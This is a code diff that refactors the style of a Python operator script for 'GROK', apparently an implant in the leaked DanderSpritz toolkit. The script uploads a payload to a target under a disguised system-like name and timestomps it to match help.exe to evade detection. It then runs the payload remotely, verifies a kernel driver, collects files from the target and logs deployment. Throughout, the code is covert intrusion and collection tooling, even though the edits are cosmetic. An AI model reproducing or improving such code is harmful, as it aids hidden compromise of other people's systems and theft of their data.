@@ -34,9 +34,9 @@ def grokverify(input):
     else:
         dsz.ui.Echo('msrtdv.sys driver missing ... FAILED', dsz.ERROR)
         driverSuccessFlag = False
-    if ((driverSuccessFlag == True) and (storageSuccessFlag == True)):
+    if driverSuccessFlag and storageSuccessFlag:
         dsz.ui.Echo('GROK properly installed on target', dsz.GOOD)
-    elif (((driverSuccessFlag == False) and (storageSuccessFlag == True)) or ((driverSuccessFlag == True) and (storageSuccessFlag == False))):
+    elif not driverSuccessFlag and storageSuccessFlag or driverSuccessFlag:
         dsz.ui.Echo('GROK is in a bad state', dsz.WARNING)
         success = False
     else:
@@ -45,16 +45,16 @@ def grokverify(input):
     return success
 
 def putfile(localfile, remotefile):
-    dsz.ui.Echo(('Putting %s on target as %s' % (localfile, remotefile)))
-    cmd = ('put %s -name %s' % (localfile, remotefile))
+    dsz.ui.Echo(f'Putting {localfile} on target as {remotefile}')
+    cmd = f'put {localfile} -name {remotefile}'
     dsz.control.echo.Off()
     global putid
     (runsuccess, putid) = dsz.cmd.RunEx(cmd)
     dsz.control.echo.On()
     if (not runsuccess):
-        dsz.ui.Echo(('Could not put %s on target as %s' % (localfile, remotefile)), dsz.ERROR)
+        dsz.ui.Echo(f'Could not put {localfile} on target as {remotefile}', dsz.ERROR)
         return False
-    dsz.ui.Echo(('Successfully put %s on target as %s' % (localfile, remotefile)))
+    dsz.ui.Echo(f'Successfully put {localfile} on target as {remotefile}')
     cmd = ('matchfiletimes -src %s\\help.exe -dst %s' % (systemPath, remotefile))
     dsz.control.echo.Off()
     runsuccess = dsz.cmd.Run(cmd)
@@ -67,13 +67,13 @@ def putfile(localfile, remotefile):
     return True
 
 def runfile(remotefile):
-    dsz.ui.Echo(('Running %s' % remotefile))
+    dsz.ui.Echo(f'Running {remotefile}')
     cmd = ('run -command "%s"' % remotefile)
     dsz.control.echo.Off()
     runsuccess = dsz.cmd.Run(cmd)
     dsz.control.echo.On()
     if (not runsuccess):
-        dsz.ui.Echo(('Running %s failed!!!' % remotefile), dsz.ERROR)
+        dsz.ui.Echo(f'Running {remotefile} failed!!!', dsz.ERROR)
         dsz.ui.Echo('Make sure to manually clean!!!', dsz.ERROR)
         return False
     return True
@@ -104,9 +104,7 @@ def collectfiles(temppath):
     runsuccess = dsz.cmd.Run(cmd)
     dsz.control.echo.On()
     success = parsefile(('%s\\GetFiles\\NOSEND\\%s' % (logdir, getfilename)))
-    if (not success):
-        return False
-    return True
+    return bool(success)
 
 def parsefile(file):
     (path, filename) = dsz.path.Split(file)
@@ -125,9 +123,7 @@ def grokparse(input):
         dsz.ui.Echo('No string entered', dsz.ERROR)
         return False
     success = parsefile(fullpath)
-    if (not success):
-        return False
-    return True
+    return bool(success)
 
 def sleepwait():
     while True:
@@ -145,14 +141,14 @@ def cdtotemp():
     dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
     curpath = dsz.cmd.data.Get('CurrentDirectory::path', dsz.TYPE_STRING)[0]
     temppath = ('%s\\..\\temp' % systemPath)
-    cmd = ('cd %s' % temppath)
+    cmd = f'cd {temppath}'
     dsz.cmd.Run(cmd)
     dsz.control.echo.On()
     return (temppath, curpath)
 
 def cdreturn(curpath):
     dsz.control.echo.Off()
-    cmd = ('cd %s' % curpath)
+    cmd = f'cd {curpath}'
     dsz.cmd.Run(cmd)
     dsz.control.echo.On()
     return True
@@ -178,9 +174,7 @@ def grokcollect(input):
     sleepwait()
     cdreturn(curpath)
     success = collectfiles(temppath)
-    if (not success):
-        return False
-    return True
+    return bool(success)
 
 def grokuninstall(input):
     success = putfile(('%s\\Uploads\\msgku.ex_' % GROK_PATH), ('%s\\%s' % (systemPath, fileName)))
@@ -208,7 +202,7 @@ def grokuninstall(input):
 def changename(input):
     global fileName
     fileName = dsz.ui.GetString('New upload name for GROK:', 'help16.exe')
-    dsz.ui.Echo(('*** Upload name now set to %s ***' % fileName), dsz.WARNING)
+    dsz.ui.Echo(f'*** Upload name now set to {fileName} ***', dsz.WARNING)
 
 def main():
     menuOption = 0
@@ -216,7 +210,7 @@ def main():
         dsz.ui.Echo('GROK requires a Windows OS', dsz.ERROR)
         return 0
     if dsz.version.checks.IsOs64Bit():
-        dsz.ui.Echo(('GROK %s requires x86' % version), dsz.ERROR)
+        dsz.ui.Echo(f'GROK {version} requires x86', dsz.ERROR)
         return 0
     if dsz.path.windows.GetSystemPath():
         global systemPath
@@ -224,13 +218,15 @@ def main():
     else:
         dsz.ui.Echo('Could not find system path', dsz.ERROR)
         return 0
-    menu_list = list()
-    menu_list.append({dsz.menu.Name: 'Install', dsz.menu.Function: grokinstall})
-    menu_list.append({dsz.menu.Name: 'Uninstall', dsz.menu.Function: grokuninstall})
-    menu_list.append({dsz.menu.Name: 'Verify Install', dsz.menu.Function: grokverify})
-    menu_list.append({dsz.menu.Name: 'Collect and Parse', dsz.menu.Function: grokcollect})
-    menu_list.append({dsz.menu.Name: 'Parse Local', dsz.menu.Function: grokparse})
-    menu_list.append({dsz.menu.Name: 'Change Upload Name', dsz.menu.Function: changename})
+    menu_list = [
+        {dsz.menu.Name: 'Install', dsz.menu.Function: grokinstall},
+        {dsz.menu.Name: 'Uninstall', dsz.menu.Function: grokuninstall},
+        {dsz.menu.Name: 'Verify Install', dsz.menu.Function: grokverify},
+        {dsz.menu.Name: 'Collect and Parse', dsz.menu.Function: grokcollect},
+        {dsz.menu.Name: 'Parse Local', dsz.menu.Function: grokparse},
+        {dsz.menu.Name: 'Change Upload Name', dsz.menu.Function: changename},
+    ]
+
     while (menuOption != (-1)):
         (retvalue, menuOption) = dsz.menu.ExecuteSimpleMenu(('\n\n========================\nGrok %s Menu\n========================\nUpload Name: %s\n' % (version, fileName)), menu_list)
         if (menuOption == 0):
@@ -239,16 +235,16 @@ def main():
             if (retvalue == False):
                 dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Unsuccessful')
             dsz.control.echo.Off()
-            cmd = ('stop %s' % putid)
+            cmd = f'stop {putid}'
             dsz.cmd.Run(cmd)
             dsz.control.echo.On()
-        elif (menuOption == 1):
+        elif menuOption == 1:
             if (retvalue == True):
                 dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Successful')
             if (retvalue == False):
                 dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Unsuccessful')
             dsz.control.echo.Off()
-            cmd = ('stop %s' % putid)
+            cmd = f'stop {putid}'
             dsz.cmd.Run(cmd)
             dsz.control.echo.On()
         elif (menuOption == 2):
@@ -256,17 +252,15 @@ def main():
                 dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
             if (retvalue == False):
                 dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
-        elif (menuOption == 3):
+        elif menuOption == 3:
             if (retvalue == True):
                 dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
             if (retvalue == False):
                 dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
             dsz.control.echo.Off()
-            cmd = ('stop %s' % putid)
+            cmd = f'stop {putid}'
             dsz.cmd.Run(cmd)
             dsz.control.echo.On()
-        elif (menuOption == 4):
-            pass
     dsz.ui.Echo('***************************')
     dsz.ui.Echo('*  GROK script completed. *')
     dsz.ui.Echo('***************************')
